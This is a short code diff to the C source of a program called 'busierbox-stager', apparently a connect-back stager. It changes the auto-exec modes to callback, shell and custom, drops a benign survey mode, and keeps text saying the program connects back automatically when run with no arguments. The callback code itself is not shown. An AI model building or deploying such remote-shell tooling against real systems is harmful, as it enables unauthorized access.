@@ -80,7 +80,7 @@ static void usage(FILE *out)
     fprintf(out,
         "usage: busierbox-stager [survey --json]\n"
         "       busierbox-stager [--callback-host HOST --callback-port PORT --token TOKEN]\n"
-        "                         [--output PATH] [--auto-exec none|survey|doctor|callback|bootstrap|operator-session]\n"
+        "                         [--output PATH] [--auto-exec none|callback|shell|custom]\n"
         "                         [--timeout SEC] [--retry-count N|-1] [--retry-delay SEC]\n\n"
         "With zero-arg callback mode configured, running with no arguments connects back automatically.\n"
         "No persistence, daemonization, or background beaconing is performed.\n");
@@ -691,14 +691,6 @@ int main(int argc, char **argv)
                 opts.timeout = 1;
             signal(SIGPIPE, SIG_IGN);
             return callback_session(&opts);
-        }
-        if (streq(BB_STAGER_ZERO_ARG_MODE, "survey")) {
-            char *s = survey_json();
-            if (!s)
-                return 1;
-            puts(s);
-            free(s);
-            return 0;
         }
         if (streq(BB_STAGER_ZERO_ARG_MODE, "help") || streq(BB_STAGER_ZERO_ARG_MODE, "menu")) {
             usage(stdout);
